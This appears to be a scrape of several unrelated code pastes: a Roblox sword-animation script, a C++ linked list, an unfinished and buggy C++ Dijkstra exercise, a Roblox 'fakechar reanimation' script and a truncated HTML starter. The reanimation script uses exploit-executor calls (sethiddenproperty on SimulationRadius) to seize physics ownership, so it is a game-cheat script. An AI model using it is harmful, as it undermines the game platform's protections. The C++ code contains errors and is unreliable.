		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(200),math.rad(0),math.rad(0)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-200),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(),.3)
		handle2weld.C0=clerp(handle2weld.C0,cf(),.3)
	end
	scfr = nil
	attack = false
end

local Sit = false

mouse.Button1Down:connect(function()
	if attack==false then
		if attacktype==1 and CurrentMode == ""Unsheathed"" then
			attack=true
			attacktype=2
			attackone()
		elseif attacktype==2 and CurrentMode == ""Unsheathed"" then
			attack=true
			attacktype=1
			attack2one()
		end
	end
end)


mouse.KeyDown:connect(function(k)
	k=k:lower()
	if k=='m' then
		if Character:FindFirstChild(""mus"")~=nil then
			if mus.IsPlaying == true then
				mus:Stop()
			elseif mus.IsPaused == true then
				mus:Play()
			end
		elseif Character:FindFirstChild(""mus"")==nil then
			local mus = Instance.new(""Sound"",Character)
			mus.Name = ""mus""
			mus.SoundId = musid
			mus.Looped = true
			mus.Volume = 1
			mus:Play()
		end
	elseif k=='l' then
		musid = ""rbxassetid://1074563286""
		mus.SoundId = musid
		mus:Play()
	elseif k=='k' then
		musid = ""rbxassetid://1074563286""
		mus.SoundId = musid
		mus:Play()
	end
	if k=='q' then
		if attack==false and CurrentMode == ""Unsheathed"" then
			Stab()
		end
	elseif k=='e' then
		if attack==false and CurrentMode == ""Unsheathed"" then
			Spin()
		end
	elseif k=='r' then
		if attack==false and CurrentMode == ""Unsheathed"" then
			ContAttack()
		end
	elseif k=='f' then
		if attack==false and CurrentMode == ""Unsheathed"" then
			Sheathe()
		elseif k=='f' then
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				Unsheathe()
			end
		end
	end
end)


local sine = 0
local change = 1
local val = 0

while true do
	swait()
	Humanoid.WalkSpeed = 20
	sine = sine + change
	local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
	local velderp=RootPart.Velocity.y
	hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
	if equipped==true or equipped==false then
		if attack==false then
			idle=idle+1
		else
			idle=0
		end
		if idle>=500 then
			if attack==false then
			end
		end
		if RootPart.Velocity.y > 1 and hitfloor==nil then 
			Anim=""Jump""
			if attack==false and Sit == false and CurrentMode == ""Unsheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(50),math.rad(0),math.rad(30)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-40),math.rad(5),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-.5,-1)*angles(math.rad(-20),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
				handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
			end
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(30)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(-30)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,-.2)*angles(math.rad(0),math.rad(90),math.rad(5))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
		elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
			Anim=""Fall""
			if attack==false and Sit == false and CurrentMode == ""Unsheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-5),math.rad(0),math.rad(20)),.3)
				LW.C0=clerp(LW.C0,CFrame.new(-1.40685952, 0.347550094, -0.023207128, 0.965925872, 0.224143773, -0.129409492, -0.258818924, 0.836516261, -0.482963085, 0, 0.500000119, 0.866025388),.3)
				LH.C0=clerp(LH.C0,cf(-1,-.5,-1)*angles(math.rad(-20),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
				handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
			end
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(50)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(-50)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-.5,-.5)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,-.5)*angles(math.rad(0),math.rad(90),math.rad(5))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
		elseif torvel<1 and hitfloor~=nil then
			Anim=""Idle""
			if attack==false and Sit == false and CurrentMode == ""Unsheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(40)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(40),math.rad(0),math.rad(20)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(20),math.rad(-10)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
				handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
			end
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(5)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(-5)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(5))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
			if attack==false and Sit == true and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,-2)*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-10),math.rad(0),math.rad(5)),.3)
				LW.C0=clerp(LW.C0,cf(-1.3,0.5,0)*euler(math.rad(90),math.rad(0),math.rad(30)),.3)
				LH.C0=clerp(LH.C0,cf(-1,.7,-.5)*angles(math.rad(0),math.rad(-90),math.rad(-10))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-.5,-.5)*angles(math.rad(0),math.rad(90),math.rad(70))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
		elseif torvel>2 and hitfloor~=nil then
			Anim=""Walk""
			if attack==false and Sit == false and CurrentMode == ""Unsheathed"" then
				change=2
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-5),math.rad(0),math.rad(20)),.3)
				LW.C0=clerp(LW.C0,CFrame.new(-1.40685952, 0.347550094, -0.023207128, 0.965925872, 0.224143773, -0.129409492, -0.258818924, 0.836516261, -0.482963085, 0, 0.500000119, 0.866025388),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(15),math.rad(-10),math.rad(0)),.3)
				handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
			end
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(45*math.cos(sine/10)),math.rad(0),math.rad(5)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-45*math.cos(sine/10)),math.rad(0),math.rad(-5)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-2),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(5))*angles(math.rad(-2),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
		end
	end
	if #Effects>0 then
		for e=1,#Effects do
			if Effects[e]~=nil then
				local Thing=Effects[e]
				if Thing~=nil then
					local Part=Thing[1]
					local Mode=Thing[2]
					local Delay=Thing[3]
					local IncX=Thing[4]
					local IncY=Thing[5]
					local IncZ=Thing[6]
					if Thing[1].Transparency<=1 then
						if Thing[2]==""Block1"" then
							Thing[1].CFrame=Thing[1].CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
							Mesh=Thing[1].Mesh
							Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						elseif Thing[2]==""Cylinder"" then
							Mesh=Thing[1].Mesh
							Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						elseif Thing[2]==""Blood"" then
							Mesh=Thing[7]
							Thing[1].CFrame=Thing[1].CFrame*cf(0,.5,0)
							Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						elseif Thing[2]==""Elec"" then
							Mesh=Thing[1].Mesh
							Mesh.Scale=Mesh.Scale+vt(Thing[7],Thing[8],Thing[9])
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						elseif Thing[2]==""Disappear"" then
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						end
					else
						Part.Parent=nil
						table.remove(Effects,e)
					end
				end
			end
		end
	end
end"
tiex85JD,Untitled,35657,C++,Friday 7th of July 2023 09:31:04 PM CDT,"#include <iostream>

using namespace std;

template <typename T>
class ForwardList {
public:

    ForwardList() : size(0), head(nullptr) {}

    struct Node { //односвязный список состоит из узлов
        T value; // узел хранит информативную часть
        Node* next; // и указатель на следующий узел в списке
    };

    void Push_front(const T& value) {
        head = new Node{ value, head };
        size++;
    }

    void Pop_front() {
        if (size > 0) {
            Node* temp = head;
            head = head->next;
            delete temp;
            size--;
        }
    }

    void Print() {
        Node* temp = head;
        while (temp != nullptr) {
            cout << temp->value << "" "";
            temp = temp->next;
        }
        cout << endl;
    }

    T& Front() {
        if (head != nullptr) {
            return head->value;
        }
    }

    T& Front() const {
        if (head != nullptr) {
            return head->value;
        }
    }

    int Find(const T value) {
        int i = 0;
        Node* temp = head;
        while (temp != nullptr) {
            if (temp->value == value) {
                return i;
            }
            temp = temp->next;
            i++;
        }
        return -1;
    }

    void Insert(const int index, const T value) {
        if (index == 0) {
            Push_front(value);
            return;
        }
        if (index > 0 && index <= size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            temp->next = new Node{ value, temp->next };
            size++;
        }
    }

    void Erase(const int index) {
        if (index == 0) {
            Pop_front();
            return;
        }
        if (index > 0 && index < size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            Node* buf = temp->next->next;
            delete temp->next;
            temp->next = buf;
            size--;
        }
    }

    void Clear() {
        while (head != nullptr) {
            Pop_front();
        }
    }

    int Size() const {
        return size;
    }

    bool operator==(const ForwardList& other) {
        if (size != other.size) {
            return false;
        }
        Node* temp = head;
        Node* other_temp = other.head;
        while (temp != nullptr) {
            if (temp->value != other_temp->value) {
                return false;
            }
            temp = temp->next;
            other_temp = other_temp->next;
        }
        return true;
    }

    bool operator!=(const ForwardList& other) {
        return !(*this == other);
    }
    /*
    Node* temp = head; //указатель на узел

    *temp; // получение доступа ко всему узлу через разименовани

    temp->next; // получение доступа к полю next через разыменование только этого поля
    */

    ~ForwardList() {
        Clear();
    }

private:
    int size;
    Node* head;
};

int main() {
    ForwardList<int> list1;

    for (int i = 0; i < 10; i++) {
        list1.Push_front(i + 1);
    }
    list1.Print();
    cout << list1.Size() << endl;

    for (int i = 0; i < 3; i++) {
        list1.Pop_front();
    }
    list1.Print();
    cout << ""size = "" << list1.Size() << endl;

    cout << list1.Front() << endl;
    cout << list1.Find(5) << endl;

    list1.Insert(3, 10);
    list1.Print();
    list1.Erase(3);
    list1.Print();
    cout << ""============="" << endl;
    list1.Clear();
    list1.Print();
}"
bsX4cmYU,codigo.cpp,mendoza_franco,C++,Friday 7th of July 2023 09:18:06 PM CDT,"#include <iostream>
#include ""funcionesLinux.h""
using namespace std;
////////////////////////////////////////////////////////////////////////////////////////////////////////////
static int      nodoOrigen, nodoDestino;
static double   mIncidencia[16][16] = {};
 const char  *codigo [] = {	""V1"",""V2"",""V3"",""V4"",""Y1"",""Y2"",""Y3"",""Y4"",""Q1"",""Q2"",""Q3"",""P1"",""P2"",""P3"",""P4"",""P5""};	//0-15
 const char  *nombre [] = {	""Dr.Manuel Belgrano"",""Palpala"",""San Antonio"",""El Carmen"",
							""San Pedro"",""Ledesma"",""Santa Barbara"",""Valle Grande"",
							""Tumbaya"",""Tilcara"",""Humahuaca"",
							""Cochinoca"",""La Quiaca"",""Susques"",""Rinconada"",""Santa Catalina""};					//0-15
const int		*marca [] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 };	//PARA SABER SI YA PASO POR AQUI
//const float	*distancia [] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 };	//Km
     
void listado(){
	int posX = 55;    
	colors(7);                                                                                      
	posicionar(posX,1);	cout<<(char)219<<"" - LISTA DE CODIGOS: "";//QUE EL MENU SEA CON NUMEROS Y NO CON CODIGO
	posicionar(posX,2);	cout<<(char)219;
		{	//LISTADO DEL MENU
			for(int i = 0; i<=20; i++ ){
				colors(7); posicionar(posX,2+i);	cout<<(char)219;
			}	
			colors(3);	posicionar(posX+1,3);	cout<<"" > VALLES: "";
			for(int i = 0; i < 4; i++){
					posicionar(posX+4,4+i);	cout<<""\t""<<i+1<<"": ""<<nombre[i]<<"" (""<<codigo[i]<<"")"";	
				}
			colors(10);	posicionar(posX+1,8);	cout<<"" > YUNGAS: "";
				for(int i = 4; i < 8; i++){
					posicionar(posX+4,5+i);	cout<<""\t""<<i+1<<"": ""<<nombre[i]<<"" (""<<codigo[i]<<"")"";	
				}
			colors(6);  posicionar(posX+1,13);	cout<<"" > QUEBRADA: "";
				for(int i = 8; i < 11; i++){
					posicionar(posX+4,6+i);	cout<<""\t""<<i+1<<"": ""<<nombre[i]<<"" (""<<codigo[i]<<"")"";	
				}
			colors(12); posicionar(posX+1,17);	cout<<"" > PUNA: "";
				for(int i = 11; i < 16; i++){
					posicionar(posX+4,7+i);	cout<<""\t""<<i+1<<"": ""<<nombre[i]<<"" (""<<codigo[i]<<"")"";	
			}
		}
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////
void menuSeleccion(){
	bool bandera = false;
		listado();
				posicionar(2,1); 
					colors(7); 	cout<<"" > DESDE DONDE HACE EL ENVIO:"";	
					colors(2); 	nodoOrigen = takeOption(""\t"",1,16);
								nodoOrigen = nodoOrigen-1;	//-1 PORQUE 
			do{
				posicionar(2,4);
					colors(7);	cout<<"" > HACIA DONDE:"";
					colors(4); 	nodoDestino = takeOption(""\t"",1,16);
								nodoDestino = nodoDestino-1;	//-1 PORQUE 
						if (nodoOrigen != nodoDestino){
							posicionar(2,5);	
								colors(2);	cout<<"" PROCESANDO: ""<<endl;
							break;	
						}
						else{	
							posicionar(2,5);	cout<<"" - ¡ERROR! : VERIFIQUE EL DESTINO."";
								
						}
			}while(1);
			colors(7); 	
}
////////////////////////////////////////////////////////////////////////////////////////////////
void matrizIncidencia(){
	int numero;
	for(int y = 0; y<16; y++ ){
		for(int x = 0; x<16; x++){
			mIncidencia[x][y] = 0;
		}
	}
	//INFERIOR
	mIncidencia[0][1] = 14,2; //SSJ. - PALPALA
	mIncidencia[0][2] = 32,4; //SSJ. - SAN ANTONIO
	mIncidencia[0][3] = 26,5; //SSJ. - EL CARMEN
	mIncidencia[0][8] = 49,0; //SSJ. - TUMBAYA
	mIncidencia[1][3] = 27,7; //PALPALA - EL CARMEN
	mIncidencia[1][4] = 51,9; //PALPALA - SAN PEDRO
	mIncidencia[2][3] = 7,7;  //SAN ANTONIO - EL CARMEN
	mIncidencia[4][5] = 50,5; //SAN PEDRO - LEDESMA
	mIncidencia[5][6] = 80,4; //LEDESMA - SANTA BARBARA
	mIncidencia[5][7] = 85,4; //LEDESMA - VALLE GRANDE
	mIncidencia[8][9] = 35,9; //TUMBAYA - TILCARA
	mIncidencia[8][13] = 150; //TUMBAYA - SUSQUES
	mIncidencia[9][10] = 44.5; //TILCARA - HUMAHUACA
	mIncidencia[10][11] = 110;  //HUMAHUCA - COCHINOCA
	mIncidencia[11][12] = 95,4;  //COCHINOCA - YAVI
	mIncidencia[11][13] = 159;  //COCHINOCA - SUSQUES
	mIncidencia[11][14] = 70,5;  //COCHINOCA - RINCONADA
	mIncidencia[11][15] = 141;  //COCHINOCA - STA. CATALINA
	mIncidencia[12][15] = 78,9;  //YAVI - STA.CATALINA
	mIncidencia[13][14] = 188;  //SUSQUES - RINCONADA
	mIncidencia[14][15] = 88;  //RINCONADA - STA.CATALINA
	
    //SUPERIOR - mIncidencia[x][y] = 1;
	mIncidencia[1][0] = 14,2; //SSJ. - PALPALA
	mIncidencia[2][0] = 32,4; //SSJ. - SAN ANTONIO
	mIncidencia[3][0] = 26,5; //SSJ. - EL CARMEN
	mIncidencia[8][0] = 49,0; //SSJ. - TUMBAYA
	mIncidencia[3][1] = 27,7; //PALPALA - EL CARMEN
	mIncidencia[4][1] = 51,9; //PALPALA - SAN PEDRO
	mIncidencia[3][2] = 7,7;  //SAN ANTONIO - EL CARMEN
	mIncidencia[5][4] = 50,5; //SAN PEDRO - LEDESMA
	mIncidencia[6][5] = 80,4; //LEDESMA - SANTA BARBARA
	mIncidencia[7][5] = 85,4; //LEDESMA - VALLE GRANDE
	mIncidencia[9][8] = 35,9; //TUMBAYA - TILCARA
	mIncidencia[13][8] = 150; //TUMBAYA - SUSQUES
	mIncidencia[10][9] = 44.5; //TILCARA - HUMAHUACA
	mIncidencia[11][10] = 110;  //HUMAHUCA - COCHINOCA
	mIncidencia[12][11] = 95,4;  //COCHINOCA - YAVI
	mIncidencia[13][11] = 159;  //COCHINOCA - SUSQUES
	mIncidencia[14][11] = 70,5;  //COCHINOCA - RINCONADA
	mIncidencia[15][11] = 141;  //COCHINOCA - STA. CATALINA
	mIncidencia[15][12] = 78,9;  //YAVI - STA.CATALINA
	mIncidencia[14][13] = 188;  //SUSQUES - RINCONADA
	mIncidencia[15][14] = 88;  //RINCONADA - STA.CATALINA
	//mostrar
	cout<<"" - MATRIZ DE INCIDENCIA:	""<<endl;
	cout<<""  "";
		for(int i=0; i<16; i++){
			cout<<codigo[i]<<"","";
		}
		cout<<""\n"";
			for(int j = 0; j<16; j++ ){
				colors(7); cout<<codigo[j]<<"" "";
				for(int i = 0; i<16; i++){
					numero = mIncidencia[i][j];
					if(numero == 1){
						colors(12);	cout<<mIncidencia[i][j];
					}
					else{	
						colors(7);	cout<<mIncidencia[i][j];
					}
					if(i == 15){
						colors(7);cout<<"" >""<<j<<""\n"";
					}
					else{
						colors(7);cout<<"", "";
					}
				}
			}
			cout<<""   0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,15""<<endl;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////
void algoritmoDikstra(){
	int camino [16];
	int ultimo, nodo;
	cout<<""\n\t > ORIGEN:  ""<<nombre[nodoOrigen]<<""(""<<codigo[nodoOrigen]<<"")"";
	cout<<""\n\t > DESTINO: ""<<nombre[nodoDestino]<<""(""<<codigo[nodoDestino]<<"")"";
		camino [0] = nodoOrigen;
		ultimo = nodoOrigen;
			do{
					for(int i = ultimo;	i<16;	i++){
						camino [0] = nodoOrigen;
						//marca[nodoOrigen]=1;
					}
			}while(ultimo == nodoDestino);
		
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////
int main(void){
	menuSeleccion();
	matrizIncidencia();
	algoritmoDikstra();
return 0;}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////"
5XMhQ7uD,fakechar reanimation,Synpase_X,Lua,Friday 7th of July 2023 09:04:16 PM CDT,"-- i discovered it, NOT CREATED.

sethiddenproperty(game.Players.LocalPlayer,""MaximumSimulationRadius"",math.huge)
sethiddenproperty(game.Players.LocalPlayer,""SimulationRadius"",1.0000000331814e+32)
 
for i,v in next, game:GetService(""Players"").LocalPlayer.Character:GetDescendants() do
if v:IsA(""BasePart"") then--and v.Name ~=""HumanoidRootPart"" then 
game:GetService(""RunService"").Heartbeat:connect(function()
v.Velocity = Vector3.new(0,-25.05,0)
wait(0.5)
end)
end
end
 
local char = workspace[game.Players.LocalPlayer.Name]
char.Archivable = true
 
local fakechar = char:Clone()
fakechar.Name = 'clone'
fakechar.Parent = char
fakechar.Head.face.Transparency = 1
workspace.CurrentCamera.CameraSubject = fakechar
char.Torso.Anchored = true
 
local connections = {}
 
function create(part, parent, p, r)
part.AccessoryWeld:Remove()
Instance.new(""Attachment"",part)
Instance.new(""AlignPosition"",part)
Instance.new(""AlignOrientation"",part)
Instance.new(""Attachment"",parent)
part.AlignPosition.Attachment0 = part.Attachment
part.AlignOrientation.Attachment0 = part.Attachment
part.AlignPosition.Attachment1 = parent.Attachment
part.AlignOrientation.Attachment1 = parent.Attachment
part.Attachment.Position = p
part.Attachment.Orientation = r
part.AlignPosition.MaxForce = 999999999
part.AlignPosition.MaxVelocity = math.huge
part.AlignPosition.ReactionForceEnabled = false
part.AlignPosition.Responsiveness = math.huge
part.AlignOrientation.Responsiveness = 200
part.AlignPosition.RigidityEnabled = false
part.AlignOrientation.MaxTorque = 999999999
end
 
local hats = {
Torso = char:FindFirstChild('Hat1').Handle,
Torso1 = char:FindFirstChild('Robloxclassicred').Handle,
LeftArm = char:FindFirstChild('Pink Hair').Handle,
RightArm = char:FindFirstChild('Pal Hair').Handle,
LeftLeg = char:FindFirstChild('Kate Hair').Handle,
RightLeg = char:FindFirstChild('LavanderHair').Handle
}
 
function rmesh(HatName)
for _,mesh in next, workspace[game.Players.LocalPlayer.Name][HatName]:GetDescendants() do
if mesh:IsA(""Mesh"") or mesh:IsA(""SpecialMesh"") then
mesh:Remove()
end
end
end
 
game:GetService('RunService').Heartbeat:connect(function()
    hats.Torso.Velocity = Vector3.new(30,0,0)
    hats.Torso1.Velocity = Vector3.new(30,0,0)
    hats.LeftArm.Velocity = Vector3.new(30,0,0)
    hats.RightArm.Velocity = Vector3.new(30,0,0)
    hats.LeftLeg.Velocity = Vector3.new(30,0,0)
    hats.RightLeg.Velocity = Vector3.new(30,0,0)
end)
 
table.insert(connections, game:GetService('RunService').Stepped:Connect(function()
fakechar.Torso.CanCollide = false
fakechar.Head.CanCollide = false
end))
 
 
create(hats.Torso, fakechar['Torso'], Vector3.new(.5,0,0), Vector3.new(90,0,0))
create(hats.Torso1, fakechar['Torso'], Vector3.new(-.5,0,0), Vector3.new(90,0,0))
create(hats.LeftArm, fakechar['Left Arm'], Vector3.new(), Vector3.new(90,0,0))
create(hats.RightArm, fakechar['Right Arm'], Vector3.new(), Vector3.new(90,0,0))
create(hats.LeftLeg, fakechar['Left Leg'], Vector3.new(), Vector3.new(90,0,0))
create(hats.RightLeg, fakechar['Right Leg'], Vector3.new(), Vector3.new(90,0,0))
 
rmesh('Hat1')
rmesh('Robloxclassicred')
rmesh('Pink Hair')
rmesh('Pal Hair')
rmesh('Kate Hair')
rmesh('LavanderHair')
 
local kill = false
 
for i,v in next, fakechar:GetDescendants() do
if v:IsA(""BasePart"") then
v.Transparency = 1
end
end
 
fakechar.Humanoid.Died:Connect(function()
   game.Players.LocalPlayer.Character = char
   char:BreakJoints()
   fakechar:Destroy()
kill = true
 
   for _,v in pairs(connections) do v:Disconnect() end
end)
char.Humanoid.Died:Connect(function()
   game.Players.LocalPlayer.Character = char
   char:BreakJoints()
   fakechar:Destroy()
kill = true
 
   for _,v in pairs(connections) do v:Disconnect() end
end)
 
game.Players.LocalPlayer.Character = fakechar"
sr6DGrPw,HTML Bootstrap - Starter,rezamalik15,HTML,Friday 7th of July 2023 09:02:47 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Title</title>
